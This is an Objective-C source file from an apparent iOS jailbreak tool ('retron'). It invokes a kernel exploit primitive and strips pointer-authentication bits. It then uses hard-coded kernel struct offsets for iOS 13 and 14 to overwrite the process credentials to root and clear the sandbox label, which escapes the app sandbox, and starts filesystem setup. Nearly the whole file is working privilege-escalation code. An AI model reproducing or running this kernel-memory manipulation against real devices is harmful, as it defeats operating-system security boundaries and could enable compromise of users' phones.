//
//  jailbreak.m
//  reton
//
//  Created by Luca on 15.02.21.
//

#include "jailbreak.h"
#include <sys/sysctl.h>
#include "../Misc/support.h"
#include <UIKit/UIKit.h>
#include <Foundation/Foundation.h>
#include <mach/mach.h>
#include "ViewController.h"
#include "jelbrekLib.h"

#define CPU_SUBTYPE_ARM64E              ((cpu_subtype_t) 2)

cpu_subtype_t get_cpu_subtype() {
    cpu_subtype_t ret = 0;
    cpu_subtype_t *cpu_subtype = NULL;
    size_t *cpu_subtype_size = NULL;
    cpu_subtype = (cpu_subtype_t *)malloc(sizeof(cpu_subtype_t));
    bzero(cpu_subtype, sizeof(cpu_subtype_t));
    cpu_subtype_size = (size_t *)malloc(sizeof(size_t));
    bzero(cpu_subtype_size, sizeof(size_t));
    *cpu_subtype_size = sizeof(cpu_subtype_size);
    if (sysctlbyname("hw.cpusubtype", cpu_subtype, cpu_subtype_size, NULL, 0) != 0) return 0;
    ret = *cpu_subtype;
    return ret;
}

#define IS_PAC (get_cpu_subtype() == CPU_SUBTYPE_ARM64E)

static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

static unsigned off_sandbox_slot = 0x10;

int jailbreak(void *init){
    ViewController *apiController = [UIApplication sharedApplication].keyWindow.rootViewController;
    [apiController sendMessageToLog:@"========================= Stage 1 ========================="];
    NSLog(@"Running jailbreak");
    uint64_t task_pac = cicuta_virosa();
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Task-PAC: 0x%llx", task_pac]];
    printf("task PAC: 0x%llx\n", task_pac);
    uint64_t task = task_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", task_pac, task);
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", task_pac, task]];
    uint64_t proc_pac;
    if(SYSTEM_VERSION_LESS_THAN(@"14.0")){
        if(IS_PAC){
            proc_pac = read_64(task + 0x388);
        } else {
            proc_pac = read_64(task + 0x380);
        }
    } else {
        if(IS_PAC){
            proc_pac = read_64(task + 0x3a0);
        } else {
            proc_pac = read_64(task + 0x390);
        }
    }
    printf("proc PAC: 0x%llx\n", proc_pac);
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Proc-PAC: 0x%llx", proc_pac]];
    uint64_t proc = proc_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", proc_pac, proc);
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", proc_pac, proc]];
    uint64_t ucred_pac;
    if(SYSTEM_VERSION_LESS_THAN(@"14.0")){
        ucred_pac = read_64(proc + 0x100);
    } else {
        ucred_pac = read_64(proc + 0xf0);
    }
    printf("ucred PAC: 0x%llx\n", ucred_pac);
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> uCRED-PAC: 0x%llx", ucred_pac]];
    uint64_t ucred = ucred_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", ucred_pac, ucred);
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC-Decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred]];
    uint32_t buffer[5] = {0, 0, 0, 1, 0};
    write_20(ucred + off_ucred_cr_uid, (void*)buffer);
    uint32_t uid = getuid();
    printf("getuid() returns %u\n", uid);
    [apiController sendMessageToLog:@"========================= Stage 2 ========================="];
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> getuid() returns %u", uid]];
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> whoami: %s", uid == 0 ? "root" : "mobile"]];
    printf("whoami: %s\n", uid == 0 ? "root" : "mobile");
    printf("Escaping sandbox.\n");
    [apiController sendMessageToLog:@"========================= Stage 3 ========================="];
    uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
    [apiController sendMessageToLog:[NSString stringWithFormat:@"==> PAC decrypt: 0x%llx -> 0x%llx", cr_label_pac, cr_label]];
    write_20(cr_label + off_sandbox_slot, (void*)buffer);
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/escaped" contents:nil attributes:nil];
    if([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/escaped"]){
        printf("Escaped sandbox!\n");
        [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Successfully escaped Sandbox"]];
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/escaped" error:nil];
    } else {
        printf("Could not escape the sandbox\n");
        [apiController sendMessageToLog:[NSString stringWithFormat:@"==> Could not escape the Sandbox"]];
        return 1;
    }
    setgid(0);
    uint32_t gid = getgid();
    printf("getgid() returns %u\n", gid);
    sleep(1);
    // printf("Setting hsp4 to tfp0...");
   // if(setHSP4() == 0) printf("Successfully set hsp4 to tfp0");
    //    printf("Starting Kernel code execution....\n");
    //    [apiController sendMessageToLog:@"====================== Stage 4 (KCE) ======================"];
    //    printf("Allowing SpringBoard to show non system apps..");
    [apiController sendMessageToLog:@"========================= Stage 4 ========================="];
    if(setup_filesystem() == 0) printf("Filesystem base installed successfully");
    return 0;
}

int setup_filesystem(){
    // checking for existing installations of retron
    NSString *jailbreakPlistPath = @"/var/mobile/.retron/jailbreak.plist";
    if([[NSFileManager defaultManager] fileExistsAtPath:jailbreakPlistPath]){
        NSDictionary *jailbreakPlist = readPlist(jailbreakPlistPath);
        printf("Existing installation of retron found. (Version %s)\n", [[NSString stringWithFormat:@"%@", jailbreakPlist[@"retron_version_installed"]] UTF8String]);
        if(programVersion() != [NSString stringWithFormat:@"%@", jailbreakPlist[@"retron_version_installed"]]){
            printf("Systemwide installed version and current version mismatch (%s) / (%s)!\n", [[NSString stringWithFormat:@"%@", jailbreakPlist[@"retron_version_installed"]] UTF8String], [programVersion() UTF8String]);
        }
    } else {
        printf("initial installation of retron starting...\n");
    }
    return 0;
}
